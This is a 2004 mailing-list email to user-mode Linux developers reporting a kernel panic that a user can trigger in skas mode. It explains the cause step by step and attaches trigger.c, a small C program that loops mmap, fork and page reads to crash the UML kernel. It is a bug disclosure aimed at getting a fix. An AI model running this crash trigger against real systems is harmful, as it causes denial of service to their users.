Return-Path: <user-mode-linux-devel-admin@lists.sourceforge.net>
Received: from sc8-sf-mx1-b.sourceforge.net ([10.3.1.11]
	helo=sc8-sf-mx1.sourceforge.net)
	by sc8-sf-list1.sourceforge.net with esmtp (Exim 4.30)
	id 1Bfbsb-0003K4-IL for user-mode-linux-devel@lists.sourceforge.net;
	Wed, 30 Jun 2004 02:59:49 -0700
Received: from ns.sysgo.de ([213.68.67.98] helo=mailgate.sysgo.de)
	by sc8-sf-mx1.sourceforge.net with esmtp (Exim 4.34)
	id 1Bfbsa-0002AH-R1 for user-mode-linux-devel@lists.sourceforge.net;
	Wed, 30 Jun 2004 02:59:49 -0700
Received: from localhost (localhost [127.0.0.1])
	by mailgate.sysgo.de (Postfix) with ESMTP id 3F8DB47B98
	for <user-mode-linux-devel@lists.sourceforge.net>;
	Wed, 30 Jun 2004 11:59:06 +0200 (CEST)
Received: from donald.sysgo.com (unknown [172.20.1.30])
	by mailgate.sysgo.de (Postfix) with ESMTP id 275DC47B98
	for <user-mode-linux-devel@lists.sourceforge.net>;
	Wed, 30 Jun 2004 11:59:06 +0200 (CEST)
Message-ID: <40E29034.7040504@sysgo.de>
From: azu <azu@sysgo.de>
MIME-Version: 1.0
Subject: Re: [uml-devel] bad panic "Kernel stack overflow" - demo exploit
References: <40E0036D.2070108@sysgo.de>
	<200406291604.51726.blaisorblade_spam@yahoo.it>
In-Reply-To: <200406291604.51726.blaisorblade_spam@yahoo.it>
Content-Type: multipart/mixed; boundary="------------030900010907010604060206"
Sender: user-mode-linux-devel-admin@lists.sourceforge.net
Errors-To: user-mode-linux-devel-admin@lists.sourceforge.net
List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/user-mode-linux-devel>,
	<mailto:user-mode-linux-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Id: The user-mode Linux development list
	<user-mode-linux-devel.lists.sourceforge.net>
List-Post: <mailto:user-mode-linux-devel@lists.sourceforge.net>
List-Help: <mailto:user-mode-linux-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/user-mode-linux-devel>,
	<mailto:user-mode-linux-devel-request@lists.sourceforge.net?subject=subscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=user-mode-linux-devel>
Date: Wed, 30 Jun 2004 12:04:37 +0200
To: user-mode-linux-devel@lists.sourceforge.net


This is a multi-part message in MIME format.
--------------030900010907010604060206
Content-Type: text/plain; charset=ISO-8859-1; format=flowed
Content-Transfer-Encoding: quoted-printable

BlaisorBlade wrote:
> Alle 13:39, luned=EC 28 giugno 2004, azu ha scritto:
>=20
>>Hi,
>=20
>=20
>>I triggered the following panic from userspace in skas mode
>>by mapping pages above 0xa0000000 ...
>=20
>=20
>>The check is useless in skas-mode (kernel faults get filtered
>>in segv() before handle_page_fault() is called),
>>so I added an ifdef for tt mode.
>=20
>=20
> This is a more sensible version of the patch (with runtime checking ins=
tead=20
> that compile time), if I did not overlook anything: it must be an if(mo=
de_tt).=20
> I always compile in TT mode and normally don't use it (and sometimes UM=
L does=20
> not compile otherwise), and the patch must still work.
>=20
>=20
> However, I don't think this is the proper fix: please elaborate a bit m=
ore.=20
> Segv() works the same way under TT and SKAS, and I think that more like=
ly=20
> there were an actual stack overflow (try to increase=20
> CONFIG_KERNEL_STACK_ORDER and try to re-get the panic).
>

Paolo, your patch is the better one :-)

But it wasn't a stack overflow ...

Due to "overlapping" address spaces in skas mode,
it is possible to trigger the panic:
A userpage with the same address as current + 4096
must be valid in the vma, but not (yet) mapped to
the user:
0) addr =3D 0xa0000000
1) mmap a zero page to addr (valid vma) readwrite
2) fork -> mapping is now readonly
3) child writes to page
4) IF addr =3D=3D current + 4096 THEN panic
5) addr +=3D 4096
6) goto 1)

I wrote a small demo app to trigger the problem.
Limit your UML memory to 16MB or so to trigger the panic faster.



-Alex




--------------030900010907010604060206
Content-Type: text/x-csrc;
 name="trigger.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="trigger.c"

/*
 * trigger.c - triggers panic("Kernel stack overflow") in UML
 *
 * 20040630, azu@sysgo.de
 */

#include <stdio.h>
#include <setjmp.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define LOW  0xa0000000
#define HIGH 0xb0000000

int main(int argc, char **argv)
{
	unsigned long addr;
	int fd;

	fd = open("/dev/zero", O_RDWR);

	printf("This may take some time ... one more cup of coffee ...\n");

	for(addr = LOW; addr < HIGH; addr += 0x1000)
	{
		pid_t p;
		if(mmap((void*)addr, 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) == MAP_FAILED)
			printf("mmap failed\n");

		p = fork();
		if(p == -1)
			printf("fork failed\n");

		if(p == 0)
		{
			/* child context */
			int *p = (int *)addr;
			volatile int x;

			x = *p;
			return 0;
		}
		/* father context */
		waitpid(p, 0, 0);

		if(munmap((void*)addr, 0x1000) == -1)
			printf("munmap failed\n");
	}

	close(fd);
	printf("done\n");
}

--------------030900010907010604060206--



-------------------------------------------------------
This SF.Net email sponsored by Black Hat Briefings & Training.
Attend Black Hat Briefings & Training, Las Vegas July 24-29 - 
digital self defense, top technical experts, no vendor pitches, 
unmatched networking opportunities. Visit www.blackhat.com
_______________________________________________
User-mode-linux-devel mailing list
User-mode-linux-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/user-mode-linux-devel
